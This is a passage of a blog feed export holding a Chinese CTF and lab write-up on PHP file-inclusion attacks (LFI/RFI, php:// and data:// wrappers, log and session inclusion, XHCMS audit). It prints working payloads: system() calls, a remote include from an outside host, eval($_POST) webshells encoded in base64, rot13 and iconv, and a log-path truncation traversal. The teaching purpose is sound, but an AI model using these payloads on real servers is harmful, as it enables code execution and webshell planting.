    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、文件操作类安全问题&lt;/p&gt;
&lt;p&gt;2、文件下载&amp;amp;删除&amp;amp;读取&lt;/p&gt;
&lt;p&gt;3、白盒&amp;amp;黑盒&amp;a</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day42 WEB攻防-通用漏洞&amp;文件包含&amp;LFI&amp;RFI&amp;伪协议编码算法&amp;代码审计</title>
    <link href="http://example.com/2023/01/31/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://example.com/2023/01/31/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2023-01-31T04:14:41.000Z</published>
    <updated>2023-03-11T03:33:22.077Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、解释-什么是文件包含</p><p>2、分类-本地LFI&amp;远程RFI</p><p>3、利用-配合上传&amp;日志&amp;会话</p><p>4、利用-伪协议&amp;编码&amp;算法等</p><h3 id="核心知识："><a href="#核心知识：" class="headerlink" title="#核心知识："></a>#核心知识：</h3><h5 id="1、本地包含LFI-amp-远程包含RFI-区别"><a href="#1、本地包含LFI-amp-远程包含RFI-区别" class="headerlink" title="1、本地包含LFI&amp;远程包含RFI-区别"></a>1、本地包含LFI&amp;远程包含RFI-区别</h5><p>一个只能包含本地，一个可以远程加载</p><p>具体形成原因由代码和环境配置文件决定</p><h5 id="2、各类脚本语言包含代码写法-见下文"><a href="#2、各类脚本语言包含代码写法-见下文" class="headerlink" title="2、各类脚本语言包含代码写法-见下文"></a>2、各类脚本语言包含代码写法-见下文</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--#include file=&quot;1.asp&quot; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--#include file=&quot;top.aspx&quot; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;jsp:include page=&quot;head.jsp&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ include file=&quot;head.jsp&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php Include(&#x27;test.php&#x27;)?&gt;</span><br></pre></td></tr></table></figure><h5 id="3、各类脚本语言包含伪协议玩法-见图"><a href="#3、各类脚本语言包含伪协议玩法-见图" class="headerlink" title="3、各类脚本语言包含伪协议玩法-见图"></a>3、各类脚本语言包含伪协议玩法-见图</h5><p><a href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a></p><h3 id="思路要点："><a href="#思路要点：" class="headerlink" title="#思路要点："></a>#思路要点：</h3><h5 id="黑盒发现："><a href="#黑盒发现：" class="headerlink" title="-黑盒发现："></a>-黑盒发现：</h5><blockquote><p>主要观察参数传递的数据和文件名是否对应</p></blockquote><h5 id="白盒发现："><a href="#白盒发现：" class="headerlink" title="-白盒发现："></a>-白盒发现：</h5><blockquote><p>1、可通过应用功能追踪代码定位审计</p><p>2、可通过脚本特定函数搜索定位审计</p><p>3、可通过伪协议玩法绕过相关修复等</p></blockquote><h3 id="本课总结："><a href="#本课总结：" class="headerlink" title="#本课总结："></a>#本课总结：</h3><p>1、有可控文件如能上传文件，配合上传后包含</p><p>2、无可控文件可以利用日志或Session&amp;伪协议</p><p>3、代码固定目录及文件后缀时需考虑版本绕过</p><p>4、伪协议玩法是建立在代码中只有变量存在时</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>​                ➢ 前置知识-原理&amp;分类&amp;探针&amp;利用&amp;修复</p><p>​                ➢ CTF应用-CTFSHOW-78关卡到117关卡</p><p>​                ➢ CMS源码-XHCMS-代码审计&amp;日志&amp;绕过</p><h5 id="前置知识-原理-amp-分类-amp-探针-amp-利用-amp-修复"><a href="#前置知识-原理-amp-分类-amp-探针-amp-利用-amp-修复" class="headerlink" title="#前置知识-原理&amp;分类&amp;探针&amp;利用&amp;修复"></a>#前置知识-原理&amp;分类&amp;探针&amp;利用&amp;修复</h5><p>实现过滤功能，是每个带代码段进行过滤编写，还是写一个过滤文件</p><p>1.每个需要过滤的地方，进行一次过滤的编写</p><p>2.每个需要过滤的地方，进行一次文件包含调用过滤函数</p><p>1.配合文件上传进行getshell，图片带有脚本后门代码，包含这个图片，脚本代码就被触发</p><p>2.配合日志文件进行getshell ，日志会记录访问UA信息，修改UA信息为后门代码，包含即执行后门代码</p><p>3.配合会话session进行getshell</p><p>文件包含</p><p>本地包含：LFI ：local file include</p><p>包含一个文件，这个文件有后门代码，就可以shell连上去</p><p>这个文件哪里来？</p><p><strong>三种思路：</strong></p><blockquote><p>1、可以通过文件上传获取，上传的文件在服务器上（上传任何后缀文件即可，因为会被include函数当作php执行）</p><p>2、没有文件上传，借助日志写入（UA），session文件写入</p><p>3、伪协议没有文件上传也能进行php代码执行，读文件，写文件（编码算法的转换）</p></blockquote><p>伪协议有条件：</p><p>（1）allow_url开关</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131142920202.png" alt="image-20230131142920202"></p><p>（2）利用伪协议php如果指定了包含目录，则不能解析</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131143116526.png" alt="image-20230131143116526"></p><p>要单纯的包含$file才行</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131143329641.png" alt="image-20230131143329641"></p><p>否则会报错：</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131143448962.png" alt="image-20230131143448962"></p><h4 id="CTF应用-CTFSHOW-78关卡到117关卡"><a href="#CTF应用-CTFSHOW-78关卡到117关卡" class="headerlink" title="#CTF应用-CTFSHOW-78关卡到117关卡"></a>#CTF应用-CTFSHOW-78关卡到117关卡</h4><h6 id="78-php-amp-http协议"><a href="#78-php-amp-http协议" class="headerlink" title="78-php&amp;http协议"></a>78-php&amp;http协议</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload: ?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">payload: ?file=php:<span class="comment">//input post:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span></span><br><span class="line"></span><br><span class="line">payload: ?file=http:<span class="comment">//www.xiaodi8.com/1.txt 1.txt:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure><h6 id="79-data-amp-http协议"><a href="#79-data-amp-http协议" class="headerlink" title="79-data&amp;http协议"></a>79-data&amp;http协议</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload: ?file=data:<span class="comment">//text/plain,&lt;?=system(&#x27;tac flag.*&#x27;);?&gt;</span></span><br><span class="line"></span><br><span class="line">payload: ?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line"></span><br><span class="line">payload: ?file=http:<span class="comment">//www.xiaodi8.com/1.txt 1.txt:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure><h6 id="80-81-日志包含"><a href="#80-81-日志包含" class="headerlink" title="80 81-日志包含"></a>80 81-日志包含</h6><p>1、利用其他协议,如file,zlib等</p><p>2、利用日志记录UA特性包含执行</p><p>分析需文件名及带有php关键字放弃</p><p>故利用日志记录UA信息，UA带入代码</p><p>包含：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><h6 id="82-86-SESSION包含"><a href="#82-86-SESSION包含" class="headerlink" title="82-86-SESSION包含"></a>82-86-SESSION包含</h6><p><a href="https://www.cnblogs.com/lnterpreter/p/14086164.html">https://www.cnblogs.com/lnterpreter/p/14086164.html</a></p><p><a href="https://www.cnblogs.com/echoDetected/p/13976405.html">https://www.cnblogs.com/echoDetected/p/13976405.html</a></p><h6 id="87-php-x2F-x2F-filter-x2F-write-amp-加密编码"><a href="#87-php-x2F-x2F-filter-x2F-write-amp-加密编码" class="headerlink" title="87-php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码"></a>87-php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码</h6><p>1、利用base64:</p><p>url编码2次：php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;123.php </p><p>content&#x3D;aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs&#x2F;Pg&#x3D;&#x3D;</p><p>编码两次的原因是浏览器会自动解码一次，第二次是因为有解码函数，所以要两次编码</p><p>2、利用凯撒13：</p><p>url编码2次：php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;2.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content=&lt;?cuc riny($_CBFG[1]);?&gt;</span><br></pre></td></tr></table></figure><h6 id="88-data-amp-base64协议"><a href="#88-data-amp-base64协议" class="headerlink" title="88-data&amp;base64协议"></a>88-data&amp;base64协议</h6><p>过滤PHP，各种符号，php代码编码写出无符号base64值</p><p>Payload：file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs&#x2F;PmFk</p><h6 id="117-php-x2F-x2F-filter-x2F-write-amp-新的算法"><a href="#117-php-x2F-x2F-filter-x2F-write-amp-新的算法" class="headerlink" title="117-php:&#x2F;&#x2F;filter&#x2F;write&amp;新的算法"></a>117-php:&#x2F;&#x2F;filter&#x2F;write&amp;新的算法</h6><p>convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;经过一次反转:&quot;</span>.<span class="variable">$result</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;经过第二次反转:&quot;</span>.<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Payload：file=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span></span><br><span class="line">contents=?&lt;hp pvela$(P_SO[T]a;)&gt;?</span><br></pre></td></tr></table></figure><h5 id="CMS源码-XHCMS-代码审计-amp-日志-amp-绕过"><a href="#CMS源码-XHCMS-代码审计-amp-日志-amp-绕过" class="headerlink" title="#CMS源码-XHCMS-代码审计&amp;日志&amp;绕过"></a>#CMS源码-XHCMS-代码审计&amp;日志&amp;绕过</h5><p>1、搜索特定函数寻包含点</p><p>2、固定目录及后缀名需绕过</p><p>3、由CMS无上传用日志包含</p><p>4、利用长度绕过后缀名固定</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Payload:</span><br><span class="line">？r=../../../Apache/logs/access.log/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span><br></pre></td></tr></table></figure><p>搜include关键词</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131163709607.png" alt="image-20230131163709607"></p><p>在index文件里面找到</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131163832954.png" alt="image-20230131163832954"></p><p>已知利用伪协议不能固定目录，所以排除三种思路里面的这种绕过方法，且这个cms没有上传点，排除思路一，采用思路二（只有php低版本适用此payload）</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131165529965.png" alt="image-20230131165529965"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、解释-什么是文件包含&lt;/p&gt;
&lt;p&gt;2、分类-本地LFI&amp;amp;远程RFI&lt;/p&gt;
&lt;p&gt;3、利用-配合上传&amp;am</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
</feed>
